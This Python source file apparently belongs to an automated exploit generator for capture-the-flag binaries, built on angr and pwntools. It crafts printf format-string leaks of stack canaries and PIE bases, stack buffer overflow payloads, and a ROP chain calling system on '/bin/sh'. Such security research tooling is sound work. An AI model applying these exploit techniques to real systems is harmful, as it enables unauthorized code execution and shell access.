import angr
import archinfo
import os.path
from dataclasses import dataclass
from goals import Goal, SystemFunction, WinFunction
from pwn import p64, process, ROP, context
from vulns import (
    Vulnerability,
    StackBufferOverflow,
    WinFunctionCall,
    UnconstrainedPrintf,
    BufferWrite,
)
from binary import Binary
from typing import Optional
from constants import PROCESS_STDOUT_WAIT_TIMEOUT


@dataclass
class ExploitError(Exception):
    message: str


@dataclass
class Leak:
    canary: int
    executable_base_address: int


    def __repr__(self) -> str:
        return f"""
            canary = 0x{self.canary:x}
            executable base address = 0x{self.executable_base_address:x}
            """


@dataclass
class PrintfLeakPayload:
    payload: bytes
    leaks_canary: bool
    leaks_pie: bool
    pie_leak_offset: int


    def extract_leak(self, leak: bytes) -> Leak:
        leak_parts = leak.split(b"0x", maxsplit=1)[-1].split(b"\n")[0].split(b".")
        i = 0
        canary = None
        executable_base_address = None
        if self.leaks_canary:
            canary = int(leak_parts[i], 16)
            i += 1
        if self.leaks_pie:
            pie_leak = int(leak_parts[i], 16)
            executable_base_address = pie_leak - self.pie_leak_offset
        return Leak(canary, executable_base_address)


def exploit(binary: Binary, goals: list[Goal], vulns: list[Vulnerability]) -> bytes:
    leak_payload: Optional[PrintfLeakPayload] = None
    if binary.canary or binary.pie:
        leak_payloads = gen_leak_payloads(binary, vulns)
        if len(leak_payloads) == 0:
            raise ExploitError("Failed to generate stack canary and/or PIE leak payload")
        leak_payload = leak_payloads[0]

    for goal in goals:
        print(f"Current goal: {goal}")
        try:
            with context.quiet:
                p = process(
                    os.path.abspath(binary.path), cwd=os.path.dirname(binary.path)
                )

                # Leaks required values from memory
                leak = None
                if leak_payload is not None:
                    p.send(leak_payload.payload)

                    # recvall with a timeout but it doesn't force close the connection
                    with p.local(PROCESS_STDOUT_WAIT_TIMEOUT):
                        try:
                            while True:
                                if not p._fillbuffer():
                                    break
                        except EOFError:
                            pass
                    out = p.buffer.get()

                    # Extract leaks.
                    leak = leak_payload.extract_leak(out)
                    print(leak)

                # Compute final payload stage
                payload, style = gen_payload(binary, goal, vulns, leak)
                p.sendline(payload)

                if style == "print_flag":
                    out = p.recvall()
                    p.close()

                    if b"flag" in out:
                        return out
                    else:
                        print(f"Program outputted: {out}")
                        exit_code = p.poll()
                        print(f"Exit code: {exit_code}")
                elif style == "shell":
                    p.interactive()
                    p.close()
                    return None
                else:
                    print(f"Unknown exploit style '{style}'")
                    p.interactive()
                    p.close()
            print("Exploit didn't print flag. Trying next goal.\n")
        except ExploitError as e:
            raise ExploitError(f"Failed to achieve goal: {e}")

    raise ExploitError("No solvable goals")


def gen_leak_payloads(binary: Binary, vulns: list[Vulnerability]) -> list[PrintfLeakPayload]:
    res = []
    for vuln in vulns:
        if not isinstance(vuln, UnconstrainedPrintf):
            continue
        res.append(gen_printf_payload(binary, vuln))
    return res


def gen_printf_payload(binary: Binary, vuln: UnconstrainedPrintf) -> PrintfLeakPayload:
    # TODO: Libc leak at index 41
    state = vuln.state.copy()
    stack_size = state.solver.eval(state.regs.rbp - state.regs.rsp)
    base_index = stack_size // 8
    canary_index = base_index + 5
    pie_leak_index = base_index + 7
    print(state.regs.rip)
    format_string = b""
    if binary.canary:
        format_string += f"%{canary_index}$p.".encode()
    if binary.pie:
        format_string += f"%{pie_leak_index}$p.".encode()
    format_string += b"\x00"
    print(format_string)
    print(f"system = {hex(binary.loader.find_symbol("system").rebased_addr)}")

    rdi = state.regs.rdi
    constraint = format_string == state.memory.load(rdi, len(format_string))
    if not state.solver.satisfiable(extra_constraints=[constraint]):
        raise ExploitError(f"Failed to constrain printf input to {format_string}")
    state.solver.add(constraint)
    payload = get_satisfying_input(state)

    for i in range(5):
        state = state.step()[0]
    for offset in range(-20, 20):
        leak = state.memory.load(state.regs.rbp + offset * 8, 8, endness=archinfo.Endness.LE)
        leak = state.solver.eval(leak)
        if leak % 0x1000 == 0x2d2:
            print("HERE HERE HERE")
        print(f"{offset}: {hex(leak)}")

    return PrintfLeakPayload(
        payload,
        binary.canary,
        binary.pie,
        0
    )


def gen_payload(
    binary: Binary, goal: Goal, vulns: list[Vulnerability], leak: Optional[Leak]
) -> tuple[bytes, str]:
    if isinstance(goal, WinFunction):
        return (gen_win_function_payload(binary, goal, vulns, leak), "print_flag")
    if isinstance(goal, SystemFunction):
        return (gen_system_function_payload(binary, goal, vulns), "shell")

    raise ExploitError(f"Cannot generate payload for {goal}")


def gen_win_function_payload(
    binary: Binary, goal: WinFunction, vulns: list[Vulnerability], leak: Optional[Leak]
) -> bytes:
    for vuln in vulns:
        if isinstance(vuln, StackBufferOverflow):
            return gen_stack_buffer_overflow_payload(binary, vuln, goal, leak)
        elif isinstance(vuln, WinFunctionCall):
            return get_satisfying_input(vuln.state)

    raise ExploitError(
        "Payload generation requires a StackBufferOverflow or WinFunctionCall vulnerability"
    )


def rebase(addr: int, binary: Binary, leak: Optional[Leak]):
    if leak is None:
        return addr
    else:
        return addr - binary.elf.address + leak.executable_base_address


def gen_stack_buffer_overflow_payload(
    binary: Binary, vuln: StackBufferOverflow, goal: WinFunction, leak: Optional[Leak]
) -> bytes:
    if binary.pie:
        binary.elf.address = leak.executable_base_address
    rop = ROP(binary.elf)
    gadget = rop.find_gadget(["ret"])
    input = vuln.state.solver.eval(
        vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes
    )
    binary.elf.address
    payload = input
    print(f"goal = {rebase(goal.addr, binary, leak):x}")
    if binary.canary:
        payload += (
            b"A" * (vuln.saved_rip_offset - 16)
            + p64(leak.canary)
            + b"B" * 8
            + p64(gadget.address)
            + p64(rebase(goal.addr, binary, leak))
        )
    else:
        payload += b"A" * vuln.saved_rip_offset + p64(gadget.address) + p64(goal.addr)
    if vuln.max_write_size is not None and len(payload) > vuln.max_write_size:
        raise ExploitError("Payload exceeds vulnerability max write size")
    return payload


def get_satisfying_input(state: angr.SimState) -> bytes:
    # Angr leaves off newlines for some reason (I think...)
    return (
        state.solver.eval(
            state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
        )
        + b"\n"
    )


def gen_win_function_call_payload(
    binary: Binary, vuln: WinFunctionCall, goal: Goal
) -> bytes:
    return vuln.state.solver.eval(
        vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes
    )


def gen_system_function_payload(
    binary: Binary, goal: SystemFunction, vulns: list[Vulnerability]
) -> bytes:
    buffer_write: BufferWrite | None = next(
        (
            vuln
            for vuln in vulns
            if isinstance(vuln, BufferWrite) and vuln.buffer_type == "Global"
        ),
        None,
    )
    if buffer_write is None:
        raise ExploitError("No global buffer to write to")
    if buffer_write.buffer_len is not None and buffer_write.buffer_len < 8:
        raise ExploitError("Buffer too small")

    options = angr.options.unicorn
    options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
    base_state = binary.angr.factory.full_init_state(
        add_options=options, stdin=angr.SimFile
    )
    simgr = binary.angr.factory.simulation_manager(base_state)
    simgr.explore(find=buffer_write.instruction_addr)

    write_bin_sh_state = simgr.found[0]
    for vuln in vulns:
        if not isinstance(vuln, StackBufferOverflow):
            continue
        simgr = binary.angr.factory.simulation_manager(write_bin_sh_state.copy())
        simgr.explore(find=buffer_write.instruction_addr)
        for state in simgr.found:
            input = state.solver.eval(
                state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
            )
            if len(input) > 0:
                input += b"\n"

            rop = ROP(binary.elf)

            ret = rop.find_gadget(["ret"]).address
            rop.raw(ret)

            rop.call(goal.addr, [buffer_write.buffer_addr])

            return b"/bin/sh\n" + input + b"A" * vuln.saved_rip_offset + rop.chain()

    raise ExploitError(f"Cannot generate payload for {goal}")
